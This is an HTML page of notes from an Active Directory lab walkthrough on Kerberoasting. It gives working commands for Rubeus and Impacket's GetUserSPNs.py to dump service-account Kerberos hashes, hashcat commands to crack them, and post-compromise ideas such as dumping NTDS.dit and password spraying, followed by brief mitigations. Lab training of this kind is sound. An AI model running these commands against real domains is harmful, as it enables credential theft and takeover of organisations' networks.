<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Kerberoasting w/ Rubeus & Impacket</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Kerberoasting w/ Rubeus & Impacket</h1><br/>In this task we&#39;ll be covering one of the  most popular Kerberos attacks - Kerberoasting. Kerberoasting allows a  user to request a service ticket for any service with a registered SPN  then use that ticket to crack the service password. If the service has a  registered SPN then it can be Kerberoastable however the success of the  attack depends on how strong the password is and if it is trackable as  well as the privileges of the cracked service account. To enumerate  Kerberoastable accounts I would suggest a tool like BloodHound to find  all Kerberoastable accounts, it will allow you to see what kind of  accounts you can kerberoast if they are domain admins, and what kind of  connections they have to the rest of the domain. That is a bit out of  scope for this room but it is a great tool for finding accounts to  target.<br />In  order to perform the attack, we&#39;ll be using both Rubeus as well as  Impacket so you understand the various tools out there for  Kerberoasting. There are other tools out there such a kekeo and  Invoke-Kerberoast but I&#39;ll leave you to do your own research on those  tools.<br />I have already taken the time to put Rubeus on the machine for you, it is located in the downloads folder.<br /><a href="https://i.imgur.com/Mtl9O6B.png"><img src="images/69-1.png" alt="images/69-1.png" /></a><br /><h2>Method 1 - Rubeus</h2><br /><h2>Kerberoasting w/ Rubeus - </h2><br />1.) <code>cd Downloads</code> - navigate to the directory Rubeus is in<br />2.) <code>Rubeus.exe kerberoast</code> This will dump the Kerberos hash of any kerberoastable users    <br /><a href="https://i.imgur.com/XZegVqf.png"><img src="images/69-2.png" alt="images/69-2.png" /></a><br />copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat<br />I have created a modified rockyou wordlist in order to speed up the process download it <a href="https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt">here</a> <br />3.) <code>hashcat -m 13100 -a 0 hash.txt Pass.txt</code> - now crack that hash<br /><br /><br /><h2>Method 2 - Impacket</h2><br /><h2>Impacket Installation - </h2><br />Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket &lt; 0.9.20<br />1.) <code>cd /opt</code> navigate to your preferred directory to save tools in <br />2.) download the precompiled package from <a href="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19">https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19</a><br />3.) <code>cd Impacket-0.9.19</code> navigate to the impacket directory<br />4.) <code>pip install .</code> - this will install all needed dependencies<br /><h2>Kerberoasting w/ Impacket - </h2><br />1.) <code>cd /usr/share/doc/python3-impacket/examples/</code> - navigate to where GetUserSPNs.py is located<br />2.) <code>sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.215.150 -request</code>  - this will dump the Kerberos hash for all kerberoastable accounts it  can find on the target domain just like Rubeus does; however, this does  not have to be on the targets machine and can be done remotely.<br />3.) <code>hashcat -m 13100 -a 0 hash.txt Pass.txt</code> - now crack that hash<br /><h2>What Can a Service Account do?</h2><br />After  cracking the service account password there are various ways of  exfiltrating data or collecting loot depending on whether the service  account is a domain admin or not. If the service account is a domain  admin you have control similar to that of a golden/silver ticket and can  now gather loot such as dumping the NTDS.dit. If the service account is  not a domain admin you can use it to log into other systems and pivot  or escalate or you can use that cracked password to spray against other  service and domain admin accounts; many companies may reuse the same or  similar passwords for their service or domain admin users. If you are in  a professional pen test be aware of how the company wants you to show  risk most of the time they don&#39;t want you to exfiltrate data and will  set a goal or process for you to get in order to show risk inside of the  assessment.<br /><h2>Mitigation - Defending the Forest</h2><br /><a href="https://i.imgur.com/YPuNS2X.png"><img src="images/69-3.png" alt="images/69-3.png" /></a><br /><h2>Kerberoasting Mitigation -</h2><br />• <small> Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective</small><br />•  Don&#39;t  Make Service Accounts Domain Admins - Service accounts don&#39;t need to be  domain admins, kerberoasting won&#39;t be as effective if you don&#39;t make  service accounts domain admins.<br /><br /></div></body></html>